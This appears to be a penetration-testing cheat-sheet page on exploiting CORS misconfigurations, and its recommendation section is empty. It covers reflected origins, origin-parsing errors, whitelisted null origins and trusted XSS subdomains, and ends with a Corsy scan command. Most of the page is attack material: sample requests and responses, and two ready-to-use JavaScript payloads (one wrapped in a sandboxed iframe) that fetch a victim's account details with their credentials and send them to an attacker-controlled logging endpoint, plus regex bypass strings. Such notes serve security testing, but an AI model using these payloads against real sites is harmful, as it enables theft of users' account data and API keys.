# Cross-Origin Resource Sharing (CORS)

{% hint style="info" %}
**Description**

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

**Recommendation**

****
{% endhint %}

* **Misconfigured CORS**
  * **Server-generated **_<mark style="color:red;">**ACAO**</mark>_** header from client-specified Origin header**
    * Request
      * `GET /sensitive-victim-data HTTP/1.1` \
        `Host: vulnerable-website.com` \
        `Origin: https://malicious-website.com` \
        `Cookie: sessionid=...`
    * Response
      * `HTTP/1.1 200 OK` \
        `Access-Control-Allow-Origin: https://malicious-website.com` \
        `Access-Control-Allow-Credentials: true`
    * Execute the below payload in your PoC

```html
<script>
    var req = new XMLHttpRequest(); 
    req.onload = reqListener; 
    req.open('get','$url/accountDetails',true); 
    req.withCredentials = true; 
    req.send(); 

    function reqListener() { 
        location='/log?key='+this.responseText; 
    };
</script>
NOTE: Replace $url with targe URL
```

* **Errors parsing Origin headers**
  *   Errors in implementing matching origin by matching:

      * URL prefixes&#x20;
      * URL suffixes
      * Regular expressions

      For eg. \
      Instead of **normal-website.com**\
      We also match **hackersnormal-website.com**\
      ****Or we match **normal-website.com.evil-user.net**
* **Whitelisted null origin value**
  * If websites whitelist Origin null
  * Request
    * `GET /sensitive-victim-data` \
      `Host: vulnerable-website.com` \
      `Origin: null`
  * Response
    * `HTTP/1.1 200 OK` \
      `Access-Control-Allow-Origin: null` \
      `Access-Control-Allow-Credentials: true`
  * Execute the below payload in your exploit server:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc=
"<script> 
    var req = new XMLHttpRequest(); 
    req.onload = reqListener; 
    req.open('get','$target-url/accountDetails',true); 
    req.withCredentials = true; 
    req.send(); 

    function reqListener() { 
        location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText); 
    };
</script>">
</iframe>
```

* **Exploiting XSS via CORS trust relationships**
  * If website trusts origin that is vulnerable to XSS
  * Request
    * `GET /api/requestApiKey HTTP/1.1` \
      `Host: vulnerable-website.com` \
      `Origin: https://subdomain.vulnerable-website.com` \
      `Cookie: sessionid=...`
  * Response
    * `HTTP/1.1 200 OK` \
      `Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com` \
      `Access-Control-Allow-Credentials: true`
  * Execute below payload in subdomain
    * [https://subdomain.vulnerable-website.com/?xss=\<script>cors-stuff-here\</script>](https://subdomain.vulnerable-website.com/?xss=%3Cscript%3Ecors-stuff-here%3C/script%3E)
* Regexp bypasses
  * victimdomain.com{.attacker.com -> victimdomain.com
  * `_` supported by safari, chrome, firefox

Tools:

[https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)

```bash
python3 corsy.py -u https://haax.fr
```
